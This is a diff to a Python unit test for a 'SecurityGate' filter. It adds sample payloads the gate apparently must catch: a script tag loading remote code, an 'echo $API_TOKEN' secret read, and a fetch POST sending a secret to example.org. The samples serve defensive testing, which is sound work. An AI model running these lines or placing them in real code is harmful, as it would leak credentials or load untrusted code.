@@ -27,6 +27,9 @@ class SecurityGate(unittest.TestCase):
             'obfuscation':'A'*350,
             'binary-or-executable':b'MZ\x00\x01',
             'opaque-binary':b'\x00\xfe\x12',
+            'remote-code-load':'<script src="https://example.org/code.js"></script>',
+            'environment-secret-read':'echo $API_TOKEN',
+            'multiline-data-send':"fetch('https://example.org', {\n method: 'POST',\n body: secret\n})",
         }
         for reason,payload in samples.items():
             with self.subTest(reason=reason):
